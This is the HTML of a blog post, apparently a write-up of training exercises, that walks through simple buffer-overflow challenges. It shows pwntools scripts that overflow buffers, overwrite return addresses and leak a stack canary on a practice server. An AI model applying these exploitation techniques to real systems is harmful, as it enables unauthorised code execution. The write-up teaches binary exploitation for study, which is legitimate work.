@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="A set of simple buffer overflow challenges">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Do You Even Bof?">
+<meta property="og:url" content="http://atharvdamle.com/buffer-overflows/index.html">
+<meta property="og:site_name" content="Atharv&#39;s Blog">
+<meta property="og:description" content="A set of simple buffer overflow challenges">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-06-21T22:04:31.582Z">
+<meta property="article:modified_time" content="2022-03-09T15:44:12.414Z">
+<meta property="article:author" content="Atharv Damle">
+<meta property="article:tag" content="Code">
+<meta property="article:tag" content="Binary Exploitation">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Do You Even Bof?</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/shellcode/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/first-experience-with-pwntools/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/buffer-overflows/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/buffer-overflows/&text=Do You Even Bof?"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/buffer-overflows/&is_video=false&description=Do You Even Bof?"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Do You Even Bof?&body=Check out this article: http://atharvdamle.com/buffer-overflows/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/buffer-overflows/&name=Do You Even Bof?&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/buffer-overflows/&t=Do You Even Bof?"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chall1-png"><span class="toc-number">1.</span> <span class="toc-text">Chall1.png</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Process"><span class="toc-number">2.</span> <span class="toc-text">The Process</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jump"><span class="toc-number">3.</span> <span class="toc-text">Jump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind"><span class="toc-number">4.</span> <span class="toc-text">Blind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bestsecurity"><span class="toc-number">5.</span> <span class="toc-text">Bestsecurity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-dump"><span class="toc-number">6.</span> <span class="toc-text">Stack-dump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">7.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Do You Even Bof?
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Atharv Damle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-21T22:04:31.582Z" itemprop="datePublished">2020-06-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="tag-link-link" href="/tags/Code/" rel="tag">Code</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Chall1-png"><a href="#Chall1-png" class="headerlink" title="Chall1.png"></a>Chall1.png</h2><hr>
+<p>Surprising that the first challenge in a bof writeup is not even a bof. I’ll keep this one short. Main pointers to remember:</p>
+<ol>
+<li>The program compares some value with a constant 0x539 (1337)</li>
+<li>It uses puts</li>
+<li>Strings in the programs: “Bye”, “Your so leet!”, “%d”</li>
+<li>jne -&gt; means &#x3D;&#x3D;</li>
+<li>scanf for input</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc) &#123;</span><br><span class="line">	int check;</span><br><span class="line">	scanf(&quot;%d&quot;, &amp;check);</span><br><span class="line"></span><br><span class="line">	if (check == 1337) &#123;</span><br><span class="line">		puts(&quot;Your so leet!&quot;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		puts(&quot;Bye&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="The-Process"><a href="#The-Process" class="headerlink" title="The Process"></a>The Process</h2><hr>
+<p>Since I won’t talk about what commands I executed unless it is important, here’s the commands I use for examining the binaries.</p>
+<ol>
+<li>The classic <code>file</code></li>
+<li>Bit less classic, but amazing <code>rabin2 -z</code></li>
+<li><code>strings</code> or <code>rabin2 -zz</code> if I feel like it</li>
+<li><code>rabin2 -s</code>, mainly because I know there’s gonna be a win function.</li>
+<li><code>checksec</code> to identify the canaries</li>
+<li><code>cutter</code>, or <code>radare2</code> for disassembly. (Mainly <code>cutter</code>, cause TUI is hard)</li>
+<li>???</li>
+<li><code>cat flag</code></li>
+</ol>
+<h2 id="Jump"><a href="#Jump" class="headerlink" title="Jump"></a>Jump</h2><hr>
+<p>Very simple buffer overflow:</p>
+<ol>
+<li>Fill the buffer with padding (64 bytes from the disassembly)</li>
+<li>The program spits out a 32 bit address, and since the return address lies right after the buffer (because there are no parameters), all you have to do is encode the bytes properly.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./jump&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 2001)</span><br><span class="line"></span><br><span class="line">padding = &#x27;A&#x27; * 64</span><br><span class="line">addr = p32(0x08048536)</span><br><span class="line"></span><br><span class="line">p.sendline(padding.encode() + addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h2><hr>
+<p>Same as jump (as the program says), but you don’t know where the win function is.<br>Now that I have done jump though, this is fairly trivial, as all I have to do is <code>objdump -d blind | grep win</code> and I would have the address to put it. So same as before, fill the buffer with padding, then properly encode the address, and boom. Bof.</p>
+<p><strong>Note:</strong> The size of the buffer is very easy to find, but there might be a few cases:</p>
+<ol>
+<li>Look at the offset from <code>ebp</code> that is loaded into the buffer, right before the <code>setbuf</code> function or the vulnerable <code>gets</code></li>
+<li>Cutter would list all the variables defined in the vuln function, with offsets: eg<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">; var char *s @ ebp-0x44</span><br><span class="line">; var int32_t var_4h @ ebp-0x4</span><br></pre></td></tr></table></figure>
+Which means you can test 0x44 as the offset to your return address. (The buffer size is still 0x40). With the 32 bit int and the base pointer (presumably) stored on the stack you end up with a padding of 0x48 or 72 bytes.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./blind&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 2002)</span><br><span class="line"></span><br><span class="line">padding = &#x27;A&#x27; * 72</span><br><span class="line">ret = p32(0x080484d6)</span><br><span class="line"></span><br><span class="line">p.sendline(padding.encode() + ret)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Bestsecurity"><a href="#Bestsecurity" class="headerlink" title="Bestsecurity"></a>Bestsecurity</h2><hr>
+<p>Ah yes. Fake canaries.</p>
+<ol>
+<li>While I was told that this would be a canary challenge, <code>checksec</code> did not say the same thing. Somehow I believe <code>checksec</code> more.</li>
+<li>A simple scan of the disassembly told me that all I had to do was overwrite an integer with the value 1234, which it was comparing with.</li>
+<li>While we did not need to override the return address, if you could, it would be the same as the first one. Except this one would be a ret2libc, as the stack is non-executable.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 2003)</span><br><span class="line">#p = process(&#x27;./bestsecurity&#x27;)</span><br><span class="line"></span><br><span class="line">padding = &#x27;A&#x27; * 128</span><br><span class="line">p.sendline(padding + &#x27;1234&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Stack-dump"><a href="#Stack-dump" class="headerlink" title="Stack-dump"></a>Stack-dump</h2><hr>
+<p>This one was considerably more difficult, compared to the first 3. It was both the fact that there was an actual stack canary which I had never dealt with before, and because there was so much more stuff to do!</p>
+<ol>
+<li><code>checksec</code>: Yes there is a canary</li>
+<li>After spending more-than-very-little time (a whole day) on figuring out what the binary did, I came up with a game plan. Leak the canary using the fread and then overwrite using the fwrite. I used a combination of cutter, pwndbg and my rapidly depleting sanity to come up with this. Tbf, this is more a test of my patience at this point.</li>
+<li>To leak the canary, you use the “useful stack pointer” which is somehow 1 byte away from the actual useful pointer, to read 22 bytes (0x16) from the place where the canary is located. Which is 0x69 bytes from the pointer provided. The offset can be figured out by a combination of looking at the disassembly and dumping the whole stack in pwndbg. You only need to read 4 bytes, but fread call reads in 22 bytes, so why not.</li>
+<li>By writing the useful pointer to the first 4 bytes of the buffer, and then inspecting the memory at that location, you can get the canary.</li>
+<li>All that remains is figuring out the paddings. You can find the size of the padding in the disassembly, which is 96 bytes (0x60) before the canary (0x30 buffer + 0x30 other variables). The other 8 bytes padding after the canary are a bit hard to find. While there should be a saved version of the stack pointer and the base pointer, why are there 4 null bytes in there?? After a bit of trial and error however, and checking out the disassembly, I realized it was ebp and ebx that was saved. Then I got it to write the correct return address. (which can be found in the disassembly)</li>
+<li>Very important step. Quit the program.</li>
+</ol>
+<p><em>Some amazing pwndbg commands I used</em></p>
+<ol>
+<li><code>x/w &lt;address&gt;</code>: Basically allows me to dump the whole stack from any place I want</li>
+<li><code>info registers</code></li>
+<li><code>break</code> and <code>continue</code> and <code>ni</code></li>
+<li><code>attach</code>: attaching to pwntools script</li>
+<li><code>disassemble</code>: disassembling on the fly</li>
+</ol>
+<p><em>Interesting points to note&#x2F;Common pitfalls</em></p>
+<ol>
+<li>There is a dummy (??) gets call in there. When you put in the amount of characters to write to the buffer, you can give it large values. Perhaps that could be used to overwrite something?</li>
+<li>The overflow is based on the fact that while <code>fread</code> and <code>fwrite</code> do write a specific number of bytes <del>into the buffer</del> onto the stack, giving control of the number of bytes to write to the user is the same as not asking for them.</li>
+<li>I was stuck for a long time because I did not know about the <code>x/w</code> command in gdb. Using the disassembly to find where the canary is located and dumping it atleast in gdb is very important. I thought my canary was correct for a while before I figured this out.</li>
+<li>The significance of the last step in the process. While the first 5 steps overwrite the buffer safely, only after performing step 6 is a ret instruction executed. So the code flow would not change if that is not done. I was stuck on it for a while because I did not realize this.</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&#x27;./stack-dump&#x27;)</span><br><span class="line">p = remote(&#x27;plsdonthaq.me&#x27;, 2004)</span><br><span class="line"></span><br><span class="line"># pause()                                       # ah. debugging</span><br><span class="line"></span><br><span class="line">padding = b&#x27;A&#x27; * 96</span><br><span class="line"></span><br><span class="line">p.readuntil(&#x27;useful stack pointer &#x27;)</span><br><span class="line">point = p.readuntil(&#x27;\n&#x27;, drop=True)            # Useful stack pointer is very useful</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;a&#x27;)</span><br><span class="line">p.sendline(&#x27;4&#x27;)</span><br><span class="line">p.sendline(p32(int(point, 16) + 0x69))</span><br><span class="line">p.sendline(&#x27;b&#x27;)</span><br><span class="line"></span><br><span class="line">read = p.readuntil(&#x27;: &#x27;)                        # Reading all the input I should have read before</span><br><span class="line">read2 = p.readuntil(&#x27;: &#x27;)</span><br><span class="line"></span><br><span class="line">canary = p.recvuntil(&#x27;\n&#x27;)[:4]                  # Extracting my canary</span><br><span class="line"></span><br><span class="line">returnPadding = b&#x27;A&#x27; * 8</span><br><span class="line">ret = p32(0x080486c6)</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;a&#x27;)</span><br><span class="line">p.sendline(&#x27;112&#x27;)								# 96 + 4 + 8 + 4 bytes</span><br><span class="line">p.sendline(padding + canary + returnPadding + ret)</span><br><span class="line"></span><br><span class="line">p.sendline(&#x27;d&#x27;)                                 # Quitting the program.</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><hr>
+<p>Bof hard.<br>Very leet indeed.<br>The fact that I enjoyed it anyway makes me worried about my future.</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Chall1-png"><span class="toc-number">1.</span> <span class="toc-text">Chall1.png</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Process"><span class="toc-number">2.</span> <span class="toc-text">The Process</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Jump"><span class="toc-number">3.</span> <span class="toc-text">Jump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Blind"><span class="toc-number">4.</span> <span class="toc-text">Blind</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bestsecurity"><span class="toc-number">5.</span> <span class="toc-text">Bestsecurity</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stack-dump"><span class="toc-number">6.</span> <span class="toc-text">Stack-dump</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">7.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://atharvdamle.com/buffer-overflows/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://atharvdamle.com/buffer-overflows/&text=Do You Even Bof?"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://atharvdamle.com/buffer-overflows/&is_video=false&description=Do You Even Bof?"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Do You Even Bof?&body=Check out this article: http://atharvdamle.com/buffer-overflows/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://atharvdamle.com/buffer-overflows/&title=Do You Even Bof?"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://atharvdamle.com/buffer-overflows/&name=Do You Even Bof?&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://atharvdamle.com/buffer-overflows/&t=Do You Even Bof?"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    Atharv Damle
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
